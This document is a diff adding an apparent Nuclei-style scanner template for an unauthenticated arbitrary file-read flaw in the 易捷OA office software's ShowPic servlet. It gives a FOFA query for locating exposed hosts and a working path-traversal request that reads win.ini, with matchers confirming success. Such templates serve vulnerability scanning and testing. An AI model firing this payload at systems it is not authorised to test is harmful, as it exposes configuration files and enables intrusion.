@@ -1,0 +1,33 @@
+id: yijieOA-ShowPic-File-reading
+
+info:
+  name: 易捷OA协同办公软件 ShowPic 任意文件读取漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="/images/logon/bg_img.jpg"
+    易捷OA协同办公软件 ShowPic 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
+
+  tags: File reading
+
+
+http:
+  - raw:
+      - |
+        GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
